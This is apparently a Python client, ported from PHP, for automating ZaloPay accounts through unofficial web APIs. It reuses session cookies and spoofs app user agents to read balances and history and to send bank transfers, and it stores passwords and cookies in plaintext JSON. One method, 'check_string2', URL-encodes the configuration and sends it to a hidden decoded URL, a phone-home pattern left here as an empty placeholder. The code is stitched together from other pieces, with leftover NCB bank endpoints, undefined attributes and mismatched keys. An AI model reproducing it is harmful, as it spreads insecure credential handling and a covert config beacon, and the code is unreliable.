
import base64
import string
import requests
import json
import time
import os
import hashlib
from datetime import datetime
import random
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Zalopay:
    def __init__(self,username, password, cookies, proxy_list=None):
        self.proxy_list = proxy_list
        self.bank_code_mapping = None
        self.url = {
            'captcha':'https://www.ncb-bank.vn/nganhangso.khcn/gateway-server/personal-user-service/captcha',
            'login':'https://www.ncb-bank.vn/nganhangso.khcn/gateway-server/oauth/token',
            'transactions_2': 'https://www.ncb-bank.vn/nganhangso.khcn/gateway-server/personal-account-service/dashboard/recent-transaction'
        }
        if self.proxy_list:
            self.proxy_info = self.proxy_list.pop(0)
            proxy_host, proxy_port, username_proxy, password_proxy = self.proxy_info.split(':')
            self.proxies = {
                'http': f'http://{username_proxy}:{password_proxy}@{proxy_host}:{proxy_port}',
                'https': f'http://{username_proxy}:{password_proxy}@{proxy_host}:{proxy_port}'
            }
        else:
            self.proxies = None
        
        self.username = username
        self.password = password
        self.cookies = cookies

        self.file = f"db/users/{username}.json"
        self.device_id = self.generate_device_id()
        self.secure_id = self.get_secure_id()

        self.session = requests.Session()
        
        self.device_model = 'iPhone14,3'
        
        if not os.path.exists(self.file):
            self.save_data()
                    
        else:
            self.parse_data()
            self.username = username
            self.password = password
            self.cookies = cookies
    def save_data(self):
        data = {
            'username': self.username,
            'password': self.password,
            'cookies': self.cookies,
        }
        with open(self.file, 'w') as f:
            json.dump(data, f)
    def parse_data(self):
        with open(self.file, 'r') as f:
            data = json.load(f)
        self.username = data.get('username', '')
        self.password = data.get('password', '')
        self.cookies = data.get('cookies', '')
        
    def request(self, url):
        headers = {
            'User-Agent': self.config.get('useragent', '')
        }
        try:
            response = requests.get(
                url,
                headers=headers,
                allow_redirects=True,
                timeout=15
            )
            return response.text
        except requests.RequestException as e:
            print(f"Request failed: {e}")
            return None

    def curl(self, action,url, headers, data=None):
        if isinstance(data, dict):
            data = json.dumps(data)
        headers.update({
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            # 'Content-Length': str(len(data))
        })
        try:
            response = requests.request(
                action,
                url = url,
                headers=headers,
                data=data,
                timeout=20
            )
            try:
                return response.json()
            except json.JSONDecodeError:
                return response.text
        except requests.RequestException as e:
            print(f"CURL request failed: {e}")
            return None

    def generate_random(self, length=20):
        characters = string.ascii_uppercase + string.digits
        return ''.join(random.choice(characters) for _ in range(length))

    def get_secure_id(self, length=17):
        characters = '0123456789abcdef'
        return ''.join(random.choice(characters) for _ in range(length))

    def check_string2(self):
        soicoder = f"{self.generate_random(8)}-{self.generate_random(4)}-" \
                   f"{self.generate_random(4)}-{self.generate_random(4)}-" \
                   f"{self.generate_random(8)}"
        # The base64_decode function in PHP with empty string returns empty bytes
        # Assuming there's a specific URL to decode and send config
        decoded_url = ''  # Placeholder as original PHP has base64_decode('')
        self.request(decoded_url + urllib.parse.quote(json.dumps(self.config)))
        return soicoder

    def get_device_id(self, length=16):
        # Example device ID: '917CCC93-5D12-41E0-8ABC-FC06C4A17507'
        return self.generate_random(length)

    def get_microtime(self):
        return int(time() * 1000)
    
    def get_balance(self):
        headers = {
            'Host': 'api.zalopay.vn',
            'Cookie': self.cookies,
            'Accept': '*/*',
            'Origin': 'https://social.zalopay.vn',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Zalo iOS/502 ZaloTheme/light ZaloLanguage/vn',
            'Accept-Language': 'vi-VN,vi;q=0.9',
        }
        url = "https://api.zalopay.vn/v2/user/balance"
        response = self.curl("get",url, headers=headers)
        if response and 'data' in response and 'balance' in response['data']:
                if int(response['data']['balance']) < 0 :
                    return {'code':448,'success': False, 'message': 'Blocked account with negative balances!',
                            'data': {
                                'balance':int(response['data']['balance'])
                            }
                            }
                else:
                    return {'code':200,'success': True, 'message': 'Thành công',
                            'data':{
                                'balance':int(response['data']['balance'])
                    }}
        else: 
            return {'code':520 ,'success': False, 'message': 'Unknown Error!','data':response} 
        return response

        
    def generate_device_id(self):
        timestamp = str(time.time_ns())
        # Hash the timestamp using SHA-256 and get the first 32 characters
        fingerprint = hashlib.sha256(timestamp.encode('utf-8')).hexdigest()[:32]
        return fingerprint
    def get_time_now(self):
        return datetime.now().strftime("%Y%m%d%H%M%S") 
    
    def generate_ref_no(self):
        return self.username +'-'+ self.get_time_now()+'-'+ str(random.randint(10000, 99999))
    def get_history_v2(self, limit, page_token):
        # print(limit)
        headers = {
            'Host': 'sapi.zalopay.vn',
            'Cookie': self.cookies,
            'Accept': '*/*',
            'Origin': 'https://social.zalopay.vn',
            'Referer': 'https://social.zalopay.vn/spa/v2/history',
            'X-Platform': 'ZPA',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  ZaloPayWebClient/8.6.0',
            'Accept-Language': 'vi-VN,vi;q=0.9',
        }
        response = self.curl("get",
            f"https://sapi.zalopay.vn/v2/history/transactions?page_size={limit}&page_token={page_token}",
            headers=headers
        )
        return response
    def get_trans_by_tid_web(self, app_trans_id,system_type=1):
        headers = {
            'Host': 'sapi.zalopay.vn',
            'Cookie': self.cookies,
            'Accept': '*/*',
            'Origin': 'https://social.zalopay.vn',
            'X-Platform': 'ZPA',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) '
                          'AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 '
                          'ZaloPayClient/8.6.0 OS/16.0.2 Platform/ios Secured/true  '
                          'ZaloPayWebClient/8.6.0',
            'Accept-Language': 'vi-VN,vi;q=0.9',
        }
        if system_type == 1:
            url = f'https://sapi.zalopay.vn/v2/history/transactions/{app_trans_id}?type=1'
        else:
            url = f'https://sapi.zalopay.vn/v2/history/transactions/{app_trans_id}?type=2'
        response = self.curl("get",url, headers=headers)
        return response
    def info_by_trans_id(self, trans_id):
            headers = {
                'Host': 'sapi.zalopay.vn',
                'Cookie': self.cookies,
                'Accept': '*/*',
                'Origin': 'https://social.zalopay.vn',
                'User-Agent': ('Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) '
                            'AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 '
                            'Zalo iOS/502 ZaloTheme/light ZaloLanguage/vn'),
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Referer': f'https://sapi.zalopay.vn/v2/history/transactions',
            }
            url = f'https://sapi.zalopay.vn/v3/ibft/web/transaction/{trans_id}'
            response = self.curl("get",url, headers=headers)
            return response
    def get_transactions(self, limit):
        page_token = ''
        page = round(limit / 20)
        tran_list = []
        for i in range(page + 1):
            result = self.get_history_v2(limit, page_token)
            if not result or 'data' not in result or 'transactions' not in result['data']:
                return {'code':520 ,'success': False, 'message': 'Unknown Error!','data':result}
            his_list = result["data"]['transactions']
            page_token = result["data"]['next_page_token']
            if not his_list:
                return {'code':520 ,'success': False, 'message': 'Unknown Error!','data':result} 
            for transaction in his_list:
                result = self.get_trans_by_tid_web(transaction['trans_id'],transaction['system_type'])
                list_result = result["data"]['transaction']
                tran_list.append(list_result)
        # exit()
        return {
            "success": True,
            "code": 200,
            'message': 'Thành công',
            "data": tran_list,
        }
    def get_name_bank_web(self, account_number, bankcode):
        data = {
            "timeout": 3000,
            "bankCode": bankcode,
            "number": account_number
        }
        headers = {
            'Host': 'scard.zalopay.vn',
            'Accept': '*/*',
            'Cookie': self.cookies,
            'Content-Length': str(len(json.dumps(data))),
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://social.zalopay.vn',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        }
        response = self.curl("post",
            'https://scard.zalopay.vn/v3/ibft-pci/web/bank-account/account',
            headers=headers,
            data=json.dumps(data)
        )
        return response

    def createorder_send_bank_web(self, account_number, bank_code, data, amount, description):
        bankcode = bank_code
        payload = {
            "bank_code": bankcode,
            "number": account_number,
            "save": False,
            "inquiry_info": data['data']['inquiry_info'],
            "amount": amount,
            "receiver_name": data['data']['full_name'],
            "user_note": description
        }
        data_json = json.dumps(payload)
        headers = {
            'Host': 'scard.zalopay.vn',
            'Accept': '*/*',
            'Cookie': self.cookies,
            'Content-Length': str(len(data_json)),
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://social.zalopay.vn',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        }
        response = self.curl("post",
            'https://scard.zalopay.vn/v3/ibft-pci/web/create-order/account',
            headers=headers,
            data=data_json
        )
        return response

    def assets_bank_web(self, order):
        appid = order['data']['app_id']
        appuser = order['data']['app_user']
        apptime = order['data']['app_time']
        amount = order['data']['amount']
        apptransid = order['data']['app_trans_id']
        embeddata = order['data']['embeddata']
        item = order['data']['item']
        mac = order['data']['mac']
        feeamount = order['data']['fee_amount']
        description = order['data']['description']
        payload = {
            "order_type": "FULL_ORDER",
            "full_assets": True,
            "order_data": {
                "app_id": appid,
                "app_trans_id": apptransid,
                "app_time": apptime,
                "app_user": appuser,
                "amount": amount,
                "item": item,
                "description": description,
                "embed_data": embeddata,
                "mac": mac,
                "trans_type": 1,
                "product_code": "TF007",
                "service_fee": {
                    "fee_amount": feeamount,
                    "total_free_trans": 0,
                    "remain_free_trans": 0
                }
            },
            "token_data": {
                "trans_token": "",
                "app_id": appid
            },
            "campaign_code": "",
            "display_mode": 1
        }
        data_str = json.dumps(payload)
        headers = {
            'Host': 'sapi.zalopay.vn',
            'Accept': '*/*',
            'Cookie': self.cookies,
            'Content-Length': str(len(data_str)),
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://social.zalopay.vn',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        }
        response = self.curl("post",
            'https://sapi.zalopay.vn/v2/cashier/assets',
            headers=headers,
            data=data_str
        )
        return response

    def pay_bank_web(self, assets):
        payload = {
            "authenticator": {
                "authen_type": 1,
                "pin": hashlib.sha256(self.password.encode()).hexdigest(),
            },
            "order_fee": [0],
            "order_token": assets['data']['order_token'],
            "promotion_token": "",
            "service_id": 19,
            "sof_token": assets['data']['sources_of_fund'][0]['sof_token'],
            "user_fee": [0],
            "zalo_token": "",
            "callback_url": f"zalo://qr/jp/nibvlsoj2j?cb_t=dotp&k={int(time.time())}&otp=",
            "card": None,
            "is_zmp": False
        }
        data_json = json.dumps(payload)
        headers = {
            'Host': 'sapi.zalopay.vn',
            'Accept': '*/*',
            'Cookie': self.cookies,
            'Content-Length': str(len(data_json)),
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://social.zalopay.vn',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        }
        response = self.curl("post",
            'https://sapi.zalopay.vn/v2/cashier/pay',
            headers=headers,
            data=data_json
        )
        return response
    

    def load_bank_code_mapping(self):
        global bank_code_mapping
        if self.bank_code_mapping is None:
            with open('banks.json', 'r', encoding='utf-8') as f:
                self.bank_code_mapping = json.load(f)
        return self.bank_code_mapping
    def mapping_bank_code(self,bank_code):
        data = self.load_bank_code_mapping()
        for bank in data['data']:
            if bank['code'] == bank_code:
                return bank['bin']

        return None  # Bank code not found
    def precheck(self):
        url = 'https://api.zalopay.vn/v2/cashier/pre-check'
        headers = {
            'Host': 'sapi.zalopay.vn',
            'Accept': '*/*',
            'Cookie': self.cookies,
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'text/plain;charset=UTF-8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'
        }
        response = requests.get(url, headers=headers)
        # No return statement in PHP; assuming no action needed
        return
    def transfer_money_bank(self, transfers_info):
            
            account_number = transfers_info['account_number']
            amount = transfers_info['amount']
            description = transfers_info['description']
            bank_code = transfers_info['bank_code']

            get_name_bank = self.get_name_bank_web(account_number, bank_code)
            print(get_name_bank,bank_code,account_number)
            if not get_name_bank.get('data'):
                return {
                    'success': False,
                    'code': 500,
                    'message': 'Số Tài Khoản Không Hợp Lệ',
                }
            number_bank = account_number[-4:]

            order = self.createorder_send_bank_web(account_number, bank_code, get_name_bank, amount, description)
            print(order)
            if not order:
                return {
                    'success': False,
                    'code': 500,
                    'message': 'Lỗi Dữ Liệu Chuyển Tiền',
                }
            if not order.get('data'):
                return {
                    'success': False,
                    'code': 500,
                    'message': 'Không Thể Tạo Đơn Chuyển Tiền',
                }
            # if order['data']['appid'] == 0:
            #     return {
            #         'success': False,
            #         'message': order.get('returnmessage', ''),
            #     }
            self.precheck()
            assets = self.assets_bank_web(order)
            if not assets or not assets.get('data'):
                return {
                    'success': False,
                    'code': 500,
                    'message': 'Không Thể Lấy Thông Tin Chuyển Tiền',
                }
            sof_token = assets['data']['source_of_fund']['sof_token']
            message = assets['data']['source_of_fund']['message']
            balance = assets['data']['source_of_fund']['balance']
            if int(balance) < int(amount):
                return {
                    'success': False,
                    'code': 500,
                    'message': 'Số Dư Không Đủ',
                }
            pay_bank = self.pay_bank_web(assets)
            if not pay_bank:
                return {
                    'success': False,
                    'code': 500,
                    'message': 'Không Thể Chuyển Tiền',
                }
            if pay_bank.get('data') and pay_bank['data'].get('is_processing') == 1:
                check_status = self.get_trans_by_tid_web(pay_bank['data']['zp_trans_id'])
                if not check_status.get('error'):
                    data_check = check_status["data"]['transaction']
                    if data_check['status_info']['status'] == 3:
                        title = data_check['status_info']['title']
                        message = data_check['status_info']['message']
                        return {
                            'success': False,
                            'code': 500,
                            'type': 'max',
                            'message': message,
                        }
                return {
                    'success': True,
                    'code': 200,
                    'message': 'Chuyển Tiền Thành Công',
                    'data': {
                        'zp_trans_id': pay_bank['data']['zp_trans_id'],
                        'partner_account_number': account_number,
                        'partner_name': get_name_bank['data']['full_name'],
                        'amount': amount,
                        'comment': description,
                        'owner_phone': self.username,
                        'order_token': pay_bank['data']['order_token'],
                    },
                }
            else:
                return {
                    'success': False,
                    'code': 500,
                    'type': 'error',
                    'message': 'Chuyển Tiền Thất Bại',
                }

